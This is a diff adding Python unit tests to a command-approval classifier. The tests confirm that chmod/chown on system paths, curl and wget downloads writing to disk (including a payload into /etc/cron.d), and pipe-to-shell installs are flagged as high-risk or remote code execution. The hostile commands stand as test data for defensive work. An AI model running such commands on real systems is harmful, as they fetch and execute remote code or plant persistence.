@@ -1601,6 +1601,51 @@ class SparkCliTests(unittest.TestCase):
         self.assertEqual(decision.action_class, "container_privilege_escalation")
         self.assertEqual(decision.risk, "critical")
 
+    def test_approval_classifier_flags_chmod_chown(self) -> None:
+        for command in (
+            ["chmod", "777", "/etc/passwd"],
+            ["chmod", "+s", "/usr/bin/spark"],
+            ["chown", "root:root", "/etc/cron.d/job"],
+            ["chown", "-R", "spark", "/data"],
+        ):
+            with self.subTest(command=command):
+                decision = approval_required_for_command(command, CommandContext())
+                self.assertTrue(decision.requires_approval)
+                self.assertEqual(decision.action_class, "destructive_filesystem")
+                self.assertEqual(decision.risk, "high")
+
+    def test_approval_classifier_flags_curl_wget_file_write(self) -> None:
+        # wget writes to disk by default (no output flag required).
+        # curl writes to disk only with -o / --output / -O.
+        for command in (
+            ["wget", "https://example.com/archive.tar.gz"],
+            ["curl", "-o", "/etc/cron.d/evil", "https://example.com/payload"],
+            ["curl", "--output", "out.bin", "https://example.com/payload"],
+            ["curl", "-O", "https://example.com/payload.bin"],
+        ):
+            with self.subTest(command=command):
+                decision = approval_required_for_command(command, CommandContext())
+                self.assertTrue(decision.requires_approval)
+                self.assertEqual(decision.action_class, "destructive_filesystem")
+                self.assertEqual(decision.risk, "high")
+
+    def test_approval_classifier_curl_plain_get_is_not_file_write(self) -> None:
+        # A plain GET with no output flag does not write to the local filesystem.
+        decision = approval_required_for_command(
+            ["curl", "https://example.com/api"], CommandContext()
+        )
+        self.assertNotEqual(decision.action_class, "destructive_filesystem")
+
+    def test_approval_classifier_curl_pipe_to_shell_stays_rce(self) -> None:
+        # File-write detection must not downgrade the pipe-to-shell RCE class.
+        for command in (
+            ["curl", "https://example.com/install", "|", "bash"],
+            ["wget", "-qO-", "https://example.com/install", "|", "sh"],
+        ):
+            with self.subTest(command=command):
+                decision = approval_required_for_command(command, CommandContext())
+                self.assertEqual(decision.action_class, "remote_code_execution")
+
     def test_approval_classifier_flags_docker_exec(self) -> None:
         for command in (
             ["docker", "exec", "my-container", "bash"],
